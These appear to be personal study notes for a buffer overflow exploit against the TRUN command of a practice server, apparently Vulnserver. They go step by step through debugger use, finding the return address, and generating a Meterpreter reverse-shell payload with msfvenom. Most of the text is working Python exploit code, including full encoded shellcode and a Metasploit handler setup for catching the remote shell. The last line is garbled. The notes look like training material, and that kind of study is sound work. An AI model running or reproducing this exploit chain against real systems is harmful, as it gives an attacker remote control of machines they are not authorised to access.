run, use tasklist to get the PID and compare PID to open ports with netstat -ano | findstr "PID"
banner grab on open port with nc on linops
"TRUN /.:/" lets you do whatever the fuck you want
#!/usr/bin/python 
import socket

buf = "TRUN/.:"
buf += "2500 random characters"
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # IP and TCP PORT

s.connect(("10.50.21.25",9999)) #connect to IP and Port
print s.recv(1024) #Printing response

s.send(buf) #send Value of buffer
print s.recv(1024) # print Response

s.close() #Close connection



run the script and see how the registers take it with immunity debugger (file, attatch, select the exe)
once you find the amoutn of characters it takes, update script

#!/usr/bin/python 
import socket

buf = "TRUN/.:"
buf += "A" * 2003 # this is assuming you find it's 2003
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # IP and TCP PORT

s.connect(("10.50.21.25",9999)) #connect to IP and Port
print s.recv(1024) #Printing response

s.send(buf) #send Value of buffer
print s.recv(1024) # print Response

s.close() #Close connection

now go into the little box on the bottom of immunuity and type in '!mona modules'
in the top click 'Window' and we'll mainly be using CPU and log data
now do !mona jmp -r esp -m "essfunc.dll"
click on the first one, copy address to clipboard, now you go back and update your string with that but swithed from little endian to big endian (literally just split into 2 and reverse the order of the pairs


#!/usr/bin/python 
import socket

buf = "TRUN/.:"
buf += "A" * 2003 # this is assuming you find it's 2003
'''
625011AF -> \xAF\x11\x50\x62
'''
buf += "\xAF\x11\x50\x62"
buf += "\x90" * 15


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # IP and TCP PORT

s.connect(("10.50.21.25",9999)) #connect to IP and Port
print s.recv(1024) #Printing response

s.send(buf) #send Value of buffer
print s.recv(1024) # print Response

s.close() #Close connection


now build your payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.21.25 lport=4444 -b "\x00" -f python
add payload to script not counting first line






#!/usr/bin/python 
import socket

buf = "TRUN/.:"
buf += "A" * 2003 # this is assuming you find it's 2003
'''
625011AF -> \xAF\x11\x50\x62
'''
buf += "\xAF\x11\x50\x62"
buf += "\x90" * 15
buf += b"\xbe\xbf\xdd\xed\x48\xdb\xd9\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x59\x83\xc2\x04\x31\x72\x10\x03\x72"
buf += b"\x10\x5d\x28\x11\xa0\x2e\xd3\xea\x31\x50\xe5\x38"
buf += b"\xb8\x75\x61\x36\xe9\x45\xe1\x1a\x02\x2e\xa7\x8e"
buf += b"\x2b\xcf\xc3\xdd\x63\x20\x63\x6b\x52\x0f\x4b\xc0"
buf += b"\xa6\x0e\x37\x1b\xfb\xf0\x06\xd4\x0e\xf1\x4f\xa2"
buf += b"\x65\x1e\x1d\x62\x0d\xb2\xb2\x07\x53\x0e\xb2\xc7"
buf += b"\xdf\x2e\xcc\x62\x1f\xda\x60\x6c\x70\x72\xf2\x36"
buf += b"\x50\x73\xd7\x4c\xd8\x6b\x52\x9b\xad\xb7\x6d\xe3"
buf += b"\x07\x4c\xb9\x90\x99\x84\xf3\x66\x35\xe9\x3b\x6b"
buf += b"\x47\x2e\xfb\x94\x32\x44\xff\x29\x45\x9f\x7d\xf6"
buf += b"\xc0\x3f\x25\x7d\x72\x9b\xd7\x52\xe5\x68\xdb\x1f"
buf += b"\x61\x36\xf8\x9e\xa6\x4d\x04\x2a\x49\x81\x8c\x68"
buf += b"\x6e\x05\xd4\x2b\x0f\x1c\xb0\x9a\x30\x7e\x1c\x42"
buf += b"\x95\xf5\x8f\x95\xa9\xf6\x4f\x9a\xf7\x60\x83\x57"
buf += b"\x08\x70\x8b\xe0\x7b\x42\x14\x5b\x14\xee\xdd\x45"
buf += b"\xe3\x67\xc9\x75\x3b\xcf\x9a\x8b\xbc\x2f\xb2\x4f"
buf += b"\xe8\x7f\xac\x66\x91\x14\x2c\x86\x44\x80\x26\x10"
buf += b"\x6d\x66\x22\xf9\x19\x84\x4c\xe8\x85\x01\xaa\x5a"
buf += b"\x66\x41\x63\x1b\xd6\x21\xd3\xf3\x3c\xae\x0c\xe3"
buf += b"\x3e\x65\x25\x8e\xd0\xd3\x1d\x27\x48\x7e\xd5\xd6"
buf += b"\x95\x55\x93\xd9\x1e\x5f\x63\x97\xd6\x2a\x77\xc0"
buf += b"\x80\xd4\x87\x11\x25\xd4\xed\x15\xef\x83\x99\x17"
buf += b"\xd6\xe3\x05\xe7\x3d\x70\x41\x17\xc0\x40\x39\x2e"
buf += b"\x56\xec\x55\x4f\xb6\xec\xa5\x19\xdc\xec\xcd\xfd"
buf += b"\x84\xbf\xe8\x01\x11\xac\xa0\x97\x9a\x84\x15\x3f"
buf += b"\xf3\x2a\x43\x77\x5c\xd5\xa6\x0b\x9b\x29\x34\x24"
buf += b"\x04\x41\xc6\x74\xb4\x91\xac\x74\xe4\xf9\x3b\x5a"
buf += b"\x0b\xc9\xc4\x71\x44\x41\x4e\x14\x26\xf0\x4f\x3d"
buf += b"\xe6\xac\x50\xb2\x33\x5f\x2a\xbb\xc4\xa0\xcb\xd5"
buf += b"\xa0\xa1\xcb\xd9\xd6\x9e\x1d\xe0\xac\xe1\x9d\x57"
buf += b"\xbe\x54\x83\xfe\x55\x96\x97\x01\x7c"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # IP and TCP PORT

s.connect(("10.50.21.25",9999)) #connect to IP and Port
print s.recv(1024) #Printing response

s.send(buf) #send Value of buffer
print s.recv(1024) # print Response

s.close() #Close connection








use metasploit with msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
exploit
run the python script

Add run shell and run whatecddytt
